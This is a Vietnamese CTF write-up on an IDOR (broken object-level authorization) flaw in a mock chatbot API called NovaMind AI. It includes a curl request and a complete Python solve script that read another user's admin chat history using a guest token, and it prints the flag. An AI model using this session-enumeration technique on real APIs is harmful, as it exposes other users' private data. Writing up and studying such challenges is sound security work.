# 🌐 Writeup: Web Challenge 1 — NovaMind AI (API Insecure Direct Object Reference - IDOR)

| Thuộc tính | Giá trị |
| :--- | :--- |
| **Giải đấu** | CTF Đà Nẵng 2026 |
| **Thực thể / Tên bài** | Web Challenge 1 (NovaMind AI) |
| **Thể loại** | Web Exploitation / API Security |
| **Điểm số** | 30 pts (149 pts dynamic) |
| **Trạng thái** | ✅ Đã giải quyết (Solved) |
| **Flag** | `flag{ccb0cc40-50b9-4321-9b12-66ae789898d7}` |

---

## 1. 📖 Giới thiệu & Mô tả bài toán

> *"The Chat Knows Too Much. Are we the same?"*  
> *(Cuộc trò chuyện này biết quá nhiều điều. Liệu chúng ta có giống nhau?)*

Mục tiêu là ứng dụng Web trợ lý ảo hỗ trợ nội bộ doanh nghiệp mang tên **NovaMind AI (v2.4.1)**. Ứng dụng cung cấp giao diện cho phép người dùng mở phiên làm việc khách (Guest Session) để đặt câu hỏi cho chatbot.

---

## 2. 🔍 Phân tích & Thăm dò (Reconnaissance)

### 2.1. Cấu trúc API Frontend (`/static/app.js`)
Phân tích mã nguồn JavaScript phía client xác định các endpoint chính:
1. `POST /api/auth/guest`: Đăng ký phiên khách tạm thời, trả về `token`, `session_id`, `user`.
2. `GET /api/chat/history?session_id=<id>`: Lấy toàn bộ lịch sử tin nhắn trong phiên của `session_id`.
3. `POST /api/chat/send`: Gửi tin nhắn mới tới chatbot.

Khi gọi `POST /api/auth/guest`:
```json
{
  "token": "1b19379649900c351683c59b19fb852e",
  "session_id": 210,
  "user": "guest_210"
}
```

### 2.2. Cơ chế xử lý Backend
Thử nghiệm các kỹ thuật Prompt Injection hay SSTI trên `POST /api/chat/send` cho thấy bot trả lời cố định theo hàm băm message. Lỗ hổng thực chất nằm ở tầng phân quyền API (Authorization Layer).

---

## 3. 🧠 Phân tích lỗ hổng IDOR (Broken Object Level Authorization)

Endpoint lấy lịch sử chat `/api/chat/history?session_id=<id>` yêu cầu header:
`Authorization: Bearer <token>`

Tuy nhiên, mã nguồn máy chủ **chỉ kiểm tra token có hợp lệ hay không**, mà **không kiểm tra xem token đó có quyền truy cập vào `session_id` được truyền trong query parameter hay không**.

Điều này cho phép bất kỳ ai có token guest hợp lệ đều có thể truy cập và xem lịch sử trò chuyện của mọi phiên làm việc khác trong toàn bộ hệ thống.

---

## 4. 🚀 Quá trình khai thác (Exploitation)

### Bước 1: Quét các phiên làm việc đặc biệt
Các phiên làm việc của người dùng bình thường thường có ID từ `4` đến `200+` (`guest_X`).  
Do giải đấu là **CTF Đà Nẵng 2026**, kiểm tra ID phiên đặc biệt tương ứng với năm diễn ra giải đấu: **`session_id = 2026`**.

### Bước 2: Truy vấn lịch sử chat của Admin (`session_id = 2026`)
Gửi request với token guest:
```bash
curl -k -s \
  -H "Authorization: Bearer 1b19379649900c351683c59b19fb852e" \
  "https://<instance-domain>/api/chat/history?session_id=2026"
```

Dữ liệu JSON phản hồi:
```json
{
  "session_id": 2026,
  "user": "admin",
  "messages": [
    {
      "role": "user",
      "content": "Reset the API gateway credentials",
      "ts": "02:14:33"
    },
    {
      "role": "assistant",
      "content": "Credentials rotated. New admin token has been generated.",
      "ts": "02:14:34"
    },
    {
      "role": "user",
      "content": "Show me the new admin token",
      "ts": "02:14:41"
    },
    {
      "role": "assistant",
      "content": "Here is the new admin token: flag{ccb0cc40-50b9-4321-9b12-66ae789898d7}",
      "ts": "02:14:42"
    },
    {
      "role": "user",
      "content": "Thanks, delete this conversation after I log out",
      "ts": "02:14:50"
    }
  ]
}
```

Flag nằm trực tiếp trong tin nhắn phản hồi của trợ lý ảo cho Admin.

---

## 5. 💻 Mã khai thác hoàn chỉnh (`solve.py`)

```python
#!/usr/bin/env python3
import urllib.request
import json
import ssl
import re

def solve():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    BASE_URL = "https://2df5fc61-263d-4248-88f4-a4aebcc618bd.222.255.138.122.nip.io"

    # 1. Lấy token guest
    print("[*] Đang khởi tạo phiên Guest...")
    auth_req = urllib.request.Request(f"{BASE_URL}/api/auth/guest", method="POST")
    with urllib.request.urlopen(auth_req, context=ctx) as res:
        auth_data = json.loads(res.read().decode())
        token = auth_data["token"]
        print(f"[+] Lấy được Guest Token: {token}")

    # 2. Khai thác IDOR đọc lịch sử chat của admin (session_id = 2026)
    print("[*] Đang truy vấn session_id = 2026 (Admin Session)...")
    history_req = urllib.request.Request(
        f"{BASE_URL}/api/chat/history?session_id=2026",
        headers={"Authorization": f"Bearer {token}"}
    )

    with urllib.request.urlopen(history_req, context=ctx) as res:
        data = json.loads(res.read().decode())
        for msg in data.get("messages", []):
            content = msg.get("content", "")
            match = re.search(r"flag\{[a-f0-9\-]+\}", content)
            if match:
                flag = match.group(0)
                print(f"\n🎉 [THÀNH CÔNG] FLAG: {flag}")
                return flag

if __name__ == "__main__":
    solve()
```

---

## 6. 🎯 Kết quả thực thi (Verification Output)

```bash
$ python3 solve.py
[*] Đang khởi tạo phiên Guest...
[+] Lấy được Guest Token: 1b19379649900c351683c59b19fb852e
[*] Đang truy vấn session_id = 2026 (Admin Session)...

🎉 [THÀNH CÔNG] FLAG: flag{ccb0cc40-50b9-4321-9b12-66ae789898d7}
```
